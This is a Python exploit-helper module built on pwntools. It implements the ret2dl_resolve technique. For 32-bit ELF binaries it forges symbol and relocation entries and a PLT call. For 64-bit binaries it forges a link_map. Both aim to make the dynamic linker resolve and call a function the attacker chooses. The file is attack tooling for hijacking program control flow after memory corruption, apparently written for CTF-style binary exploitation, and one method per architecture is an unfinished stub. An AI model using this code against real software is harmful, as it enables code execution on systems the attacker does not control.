from pwn import *

class ret2dl_resolve(object):
    def __init__(self,pdbg):
        if pdbg.arch=="x86":
            self.resolve_obj=ret2dl_resolve_x86(pdbg.elf)
        elif pdbg.arch=="amd64":
            self.resolve_obj=ret2dl_resolve_x64(pdbg.elf)
        else:
            log.error("arch %s is not supported" %(pdbg.arch))


    def build_normal_resolve(self,base,function_name, resolve_target):
        return self.resolve_obj.build_normal_resolve(base,function_name,resolve_target)
    
    def build_link_map(self,fake_addr,reloc_index,offset,got_libc_address):
        return self.resolve_obj.build_link_map(fake_addr,reloc_index,offset,got_libc_address)

class ret2dl_resolve_x86(object):
    def __init__(self,ELF_obj):
        self.elf=ELF_obj
        print type(self.elf),self.elf

        
    def fill(self, size, buf=''):
        chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        buflen = size - len(buf)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        return ''.join(random.choice(chars) for i in xrange(buflen))

    def align(self, addr, origin, size):
        padlen = size - ((addr-origin) % size)
        return (addr+padlen, padlen)

    ## find the ndx is 0 according the symbols index and return the correct symbol index
    def fix_symbol_addr_by_ndx(self,sym_index):
        versym = self.elf.dynamic_value_by_tag("DT_VERSYM")#version

        while True:
            ndx = u16(self.elf.read(versym+sym_index*2,2))
            if ndx != 0:
                sym_index+=1
                continue
            else:
                break
        return sym_index

    def build_link_map(self,fake_addr,reloc_index,offset,got_libc_address):
        log.error("sorry x86 build_link_map is under construction")

    ## build the resolve data in base addr which will call the function "function_name" and put the libc address to "resolve_target"
    ## return the correct addr, and the resolve data and the plt call gadget.
    def build_normal_resolve(self,base,function_name, resolve_target):

        plt0 = self.elf.get_section_by_name('.plt').header.sh_addr
        jmprel = self.elf.dynamic_value_by_tag("DT_JMPREL")#rel_plt
        relent = self.elf.dynamic_value_by_tag("DT_RELENT")# size of jmprel struct
        symtab = self.elf.dynamic_value_by_tag("DT_SYMTAB")#dynsym
        syment = self.elf.dynamic_value_by_tag("DT_SYMENT")# size of symtab
        strtab = self.elf.dynamic_value_by_tag("DT_STRTAB")#dynstr
        versym = self.elf.dynamic_value_by_tag("DT_VERSYM")#version
        log.info("rel.plt: %s, relent: %s"%(hex(jmprel),hex(relent)))
        log.info("symtab: %s, syment: %s"%(hex(symtab),hex(syment)))
        log.info("strtab: %s"%(hex(strtab)))
        log.info("plt[0]: %s"%(hex(plt0)))


        fake_addr_sym, padlen_sym = self.align(base, symtab, syment)
        fake_symbol_index=(fake_addr_sym-symtab)/syment
        fake_symbol_index=self.fix_symbol_addr_by_ndx(fake_symbol_index)  ## ndx should be 0, so fix the index



        fake_addr_sym=symtab+fake_symbol_index*syment ## get the real symbol addr
        evil_addr=fake_addr_sym
        fake_addr_reloc, padlen_reloc = self.align(fake_addr_sym+syment, jmprel, relent)

        fake_addr_symstr = fake_addr_reloc+relent
        r_info = (((fake_addr_sym - symtab) / syment) << 8) | 0x7
        fake_st_name =fake_addr_symstr - strtab
        #print hex(st_name)

        resolve_data = struct.pack('<IIII', fake_st_name, 0, 0, 0x12)           # Elf32_Sym
        resolve_data += self.fill(padlen_reloc)
        resolve_data += struct.pack('<II', resolve_target, r_info)               # Elf32_Rel
        resolve_data += function_name

        fake_reloc_offset = fake_addr_reloc - jmprel
        resovle_call = p32(plt0)+p32(fake_reloc_offset)

        return evil_addr,resolve_data,resovle_call
        


class ret2dl_resolve_x64(object):
    def __init__(self,ELF_obj):
        self.elf=ELF_obj


    ## build the fake link_map to fake_addr. according to the reloc_index, it will adjust the fake jmprel address. which will finally call the libc_address+offset(libc_basee is stored in got_libc_address)
    def build_link_map(self,fake_addr,reloc_index,offset,got_libc_address):
        '''
        linkmap:
        0x00: START
        0x00: l_addr (offset from libc_address to target address
        0x08: 
        0x10: 
        0x14:
        0x15:
        0x18:
        0x20:
        0x28: # target address here
        0x30: fake_jmprel #r_offset 
        0x38:             #r_info should be 7
        0x40:             #r_addend 0
        0x48: 
        0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
        0x70: p_DT_SYMTAB = fake_DT_SYMTAB
        0xf8: p_DT_JMPREL = fake_DT_JMPREL
        0x100: END

        typedef struct
        {
            Elf64_Word    st_name;        /* Symbol name (string tbl index) */
            unsigned char    st_info;        /* Symbol type and binding */
            unsigned char st_other;        /* Symbol visibility */
            Elf64_Section    st_shndx;        /* Section index */
            Elf64_Addr    st_value;        /* Symbol value */
            Elf64_Xword    st_size;        /* Symbol size */
        } Elf64_Sym;

        typedef struct
        {
            Elf64_Addr    r_offset;        /* Address */
            Elf64_Xword    r_info;            /* Relocation type and symbol index */
            Elf64_Sxword    r_addend;        /* Addend */
        } Elf64_Rela;
        '''
        fake_link_map=p64(offset)
        fake_link_map=fake_link_map.ljust(0x10,'\x00')

        #fake_sym=p32(0)  #st_name whatever
        #fake_sym+=p32(0xffffffff)  #st_other should not be 0
        #fake_sym+=p64(got_libc_address-0x8) # st_value should be got libc_address
        #fake_sym=fake_sym.ljust(0x18,'\x00')
        #fake_link_map+= fake_sym
        fake_link_map=fake_link_map.ljust(0x30,'\x00')
      
        target_write=fake_addr+0x28
        fake_jmprel=p64(target_write-offset)  ## offset 
        fake_jmprel+=p64(7)
        fake_jmprel+=p64(0)
        fake_link_map+=fake_jmprel

        fake_link_map=fake_link_map.ljust(0x68,'\x00')
        fake_link_map+=p64(fake_addr)      # DT_STRTAB
        fake_link_map+=p64(fake_addr+0x78-8) #fake_DT_SYMTAB
        fake_link_map+=p64(got_libc_address-8) # symtab_addr st->other==libc_address
        fake_link_map+=p64(fake_addr+0x30-0x18*reloc_index)
        fake_link_map=fake_link_map.ljust(0xf8,'\x00')
        fake_link_map+=p64(fake_addr+0x80-8)  #fake_DT_JMPREL

        return fake_link_map
    def build_normal_resolve(self,base,function_name, resolve_target):
        log.error("sorry x64 build_normal_resolve is under constrction")
    
